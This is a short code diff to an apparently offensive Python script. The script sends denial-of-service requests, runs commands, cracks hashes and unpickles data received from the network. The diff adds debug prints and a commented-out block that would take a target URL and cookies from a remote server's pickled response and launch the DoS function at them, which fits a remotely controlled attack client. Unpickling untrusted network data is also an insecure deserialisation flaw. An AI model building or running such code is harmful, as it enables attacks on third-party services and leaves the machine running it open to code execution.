@@ -35,8 +35,10 @@ def execute(cmd):
         print(output)
         return output
 
-def DoS(headers="",url="http://httpbin.org/post",option='p',cookies=""):
+def DoS(headers="",url="http://httpbin.org/post",option='p',cookies={}):
     if option == 'p':
+        print(url)
+        print(cookies)
         r = requests.post(url,headers=headers,cookies=cookies)
     elif option == 'g':
         r = requests.get(url,headers=headers)
@@ -109,6 +111,10 @@ def main():
                 myWord = pickle.loads(response)
                 print(myWord)
                 hashcracker(myWord)
+                #Anhilate ka code
+                '''req = pickle.loads(response)
+                print(req)
+                DoS(option='p',url=req[0],cookies=req[1])'''
                 
     DoS(option='g',url='http://httpbin.org/get')
     x = input(":")
